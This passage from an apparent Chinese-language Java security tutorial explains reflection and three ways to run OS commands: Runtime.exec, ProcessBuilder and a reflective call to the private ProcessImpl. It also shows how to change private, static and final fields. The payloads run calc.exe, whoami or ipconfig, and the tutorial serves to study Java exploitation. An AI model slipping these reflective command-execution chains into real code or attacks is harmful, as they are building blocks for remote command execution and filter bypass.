</li><li>如果这个方法是一个静态方法，那么第一个参数是类</li></ul><p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…)，其实在反射里就是 method.invoke([1], [2], [3], [4]…)。 所以我们将上述命令执行的Payload分解一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(clazz);<br>execMethod.invoke(runtime, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getConstructor方法-构造函数"><a href="#getConstructor方法-构造函数" class="headerlink" title="getConstructor方法(构造函数)"></a>getConstructor方法(构造函数)</h3><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</p><p>和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p><p>获取到构造函数后，我们使用 newInstance 来执行。 </p><p>比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p><p>ProcessBuilder有两个构造函数：</p><ul><li>public ProcessBuilder(List command) </li><li>public ProcessBuilder(String… command)</li></ul><p>下面用到了第一个形式的构造函数，所以在 getConstructor 的时候传入的是 List.class 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(<br>Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>)));<br></code></pre></td></tr></table></figure><p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。</p><h3 id="可变长参数-varargs"><a href="#可变长参数-varargs" class="headerlink" title="可变长参数 varargs"></a>可变长参数 varargs</h3><p>那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反射执行呢？</p><p>这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。</p><p>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的（也就不能重载）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String[] names)</span> &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String...names)</span> &#123;&#125;<br>-----<br>String[] names = &#123;<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>&#125;;<br>hello(names);<br></code></pre></td></tr></table></figure><p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。</p><p>所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getConstructor(String[].class)<br></code></pre></td></tr></table></figure><p>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <br><span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();<br></code></pre></td></tr></table></figure><p>完全反射编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;));<br></code></pre></td></tr></table></figure><h3 id="getDeclared-系列的反射"><a href="#getDeclared-系列的反射" class="headerlink" title="getDeclared 系列的反射"></a>getDeclared 系列的反射</h3><p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p><p>getDeclared 系列的反射，与普通的 getMethod 、 getConstructor 区别是：</p><ul><li>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </li><li>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li></ul><p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似</p><p>eg. Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>m.setAccessible(<span class="hljs-literal">true</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。</p><h2 id="Java-命令执行的三种方式"><a href="#Java-命令执行的三种方式" class="headerlink" title="Java 命令执行的三种方式"></a>Java 命令执行的三种方式</h2><h3 id="1-调用-Runtime-类进行命令执行"><a href="#1-调用-Runtime-类进行命令执行" class="headerlink" title="1. 调用 Runtime 类进行命令执行"></a>1. 调用 Runtime 类进行命令执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br>  <br><span class="hljs-comment">// 使用 Runtime 类进行命令执行  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//�ʵ۵��»�\zhr_0</span><br></code></pre></td></tr></table></figure><ol><li>先调用 getRuntime() 返回一个 Runtime 对象，然后调用 Runtime 对象的 exec 的方法。</li><li>调用 Runtime 对象的 exec 的方法会返回 Process 对象，调用 Process 对象的 getInputStream() 方法。</li><li>调用 Process 对象的 getInputStream() 方法，此时，子进程已经执行了 whoami 命令作为子进程的输出，将这一段输出作为输入流传入 inputStream</li></ol><p>我们的第一行就是用来执行命令的，但是我们执行命令需要得到命令的结果，所以需要将结果存储到字节数组当中</p><p>这一段代码用来保存运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br><span class="hljs-comment">/** </span><br><span class="hljs-comment">* readLen用于存储每次读取输入流的长度</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>    byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2. ProcessBuilder"></a>2. ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br>  <br><span class="hljs-comment">// 使用 ProcessBuilder 进行命令执行操作  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessBuilderExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;ipconfig&quot;</span>).start().getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-使用-ProcessImpl"><a href="#3-使用-ProcessImpl" class="headerlink" title="3. 使用 ProcessImpl"></a>3. 使用 ProcessImpl</h3><p><code>ProcessImpl</code> 是更为底层的实现，<code>Runtime</code> 和 <code>ProcessBuilder</code> 执行命令实际上也是调用了 <code>ProcessImpl</code> 这个类，对于 <code>ProcessImpl</code> 类我们不能直接调用，但是可以通过反射来间接调用 <code>ProcessImpl</code> 来达到执行命令的目的。</p><ul><li>因为 ProcessImpl 是私有的方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 使用 ProcessImpl 进行命令执行  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImplExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;;  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class,  <br> ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);  <br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Process</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Process) method.invoke(<span class="hljs-literal">null</span>, cmds, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> e.getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Java-反射修改-static-final-修饰的字段"><a href="#Java-反射修改-static-final-修饰的字段" class="headerlink" title="Java 反射修改 static final 修饰的字段"></a>Java 反射修改 static final 修饰的字段</h2><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p><strong>PrivatePerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivatePerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>PrivateReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivateReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.PrivatePerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">PrintMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        PrintMethod.invoke(m);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;111&quot;</span>));<br>        PrintMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a03.png"></p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p><strong>StaticPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>StaticReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.StaticPerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">nameMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        nameMethod.invoke(m);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;static&quot;</span>));<br>        nameMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>final 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。<strong>直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。</strong></p><h4 id="直接赋值-无法修改"><a href="#直接赋值-无法修改" class="headerlink" title="直接赋值(无法修改)"></a>直接赋值(无法修改)</h4><p><strong>FinalStraightPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalStraightPerson</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1&quot;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>-<span class="hljs-number">2</span>;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>FinalStraightReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalStraightReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.FinalStraightPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        ageField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameField.set(m,<span class="hljs-string">&quot;2&quot;</span>);  <br>        ageField.set(m,<span class="hljs-string">&quot;10&quot;</span>);  <br>  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a04.png"></p><p>这个报错本质上不是 因为 <code>final</code>，而是类型不匹配。</p><ul><li><p>要修改的字段 <code>age</code> 类型是 <code>int</code>（<strong>基本类型</strong>）。</p></li><li><p>但是用反射 <code>set(m, &quot;10&quot;)</code> 传进去的是 <code>String</code>。</p></li><li><p>反射不做自动类型转换，所以直接报错。</p></li></ul><p>修改语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ageField.set(m, Integer.parseInt(<span class="hljs-string">&quot;10&quot;</span>));<br></code></pre></td></tr></table></figure><p>运行代码后看到name与age仍未被修改</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a05.png"></p><p><strong>JVM 对 final 字段的缓存（Unsafe &amp; 反射限制）</strong></p><ul><li>Java 的 <code>Field.setAccessible(true)</code> 虽然可以突破访问控制，但对 <code>final</code> 修饰的字段，JVM 可能会在对象创建后把值存到寄存器或内存缓存里。</li><li>这意味着即使你用反射修改了字段的底层内存，后续读取可能依旧从缓存里取旧值。</li><li>另外，<code>final</code> 字段在 JDK 1.8 里，反射修改<strong>默认是无效的</strong>（除非用 <code>Unsafe</code> 或 <code>Field.modifiers</code> 去掉 <code>final</code> 标志）。</li></ul><p>但是使用<code>Unsafe</code> 或 <code>Field.modifiers</code> 去掉 <code>final</code> 标志大概率也是不可行的</p><p><strong>JVM 可能已经把原值内联优化了</strong>，尤其是基本类型（<code>int</code>、<code>long</code> 等）和 <code>String</code> 